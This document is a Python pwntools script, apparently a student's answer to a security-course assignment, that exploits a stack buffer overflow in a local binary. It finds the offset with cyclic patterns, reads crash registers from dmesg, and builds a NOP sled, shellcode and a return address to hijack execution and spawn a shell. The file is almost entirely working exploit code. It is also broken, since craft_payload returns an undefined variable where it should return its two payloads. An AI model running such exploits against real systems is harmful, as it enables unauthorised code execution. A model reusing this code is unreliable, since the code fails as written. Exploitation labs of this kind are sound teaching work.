from pwn import *
from shellcode import get_shellcode

pwnlib.term.term_mode= False

# =============================================
# ========= write your code below  ============
# =============================================

''' returns the payload for the attack 
    given the path to the vulnerable binary
    and the shellcode from get_shellcode in shellcode.py
    (string, bytes) -> (bytes, bytes)
'''    
def craft_payload(path_to_vuln_prgm, shellcode):
  payload1 = cyclic(512)
  payload2= cyclic(1000)
  p = process([path_to_vuln_prgm, payload1,'b'*1000])
  p.wait_for_close()
  debug_info = process('dmesg | grep "vuln" | tail -n 1', stdout=subprocess.PIPE, shell=True).recvall()
  print("debug----\n")
  print(debug_info)
  eip =  int(re.search(b'at\ (.*)\ ip', debug_info).group(1),16) #return 
  esp =  int(re.search(b'sp\ (.*)\ error', debug_info).group(1).decode("ascii"),16)  #function address
  # buffer <- function address - overflow
  # shell <- buffer + half//2
  overflow_length=cyclic_find(p32(eip))
  print(overflow_length)
  half=overflow_length//4
  payload1 = asm(shellcraft.nop())*half + shellcode + b'a'*(overflow_length - len(shellcode) - half) + p32(esp - overflow_length+half//2)
  payload2= p32(esp - overflow_length+half//2)
    # overflow length based on eip
    # function address  -> esp
    # together -> buffer address start
  return payload


# =============================================
# ===== do not modify the code below ==========
# =============================================

def execute_interactive(path_to_vuln_prgm, payload):
    p = process([path_to_vuln_prgm, payload[0], payload[1]])
    p.interactive()
    
def execute_non_interactive(path_to_vuln_prgm, payload):
    p = process([path_to_vuln_prgm, payload[0], payload[1]])
    sys.stdout.buffer.write(p.recvall())

def run(path_to_vuln_prgm):
    interactive, shellcode = get_shellcode()
    payload = craft_payload(path_to_vuln_prgm, shellcode)
    if interactive:
       execute_interactive(path_to_vuln_prgm, payload)
    else:
       execute_non_interactive(path_to_vuln_prgm, payload)
    
if __name__ == "__main__":
   import os, sys, getopt
   def usage():
        print('Usage:    ' + os.path.basename(__file__) + ' path_to_vuln_prgm')
        sys.exit(2)
   try:
      opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
   except getopt.GetoptError as err:
      print(err)
      usage()
   # extract parameters
   path_to_vuln_prgm = args[0] if len(args) > 0 else None
   for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
   # check arguments
   if (path_to_vuln_prgm is None):
       print('path_to_vuln_prgm is missing\n')
       usage()
   # run the command
   run(path_to_vuln_prgm)
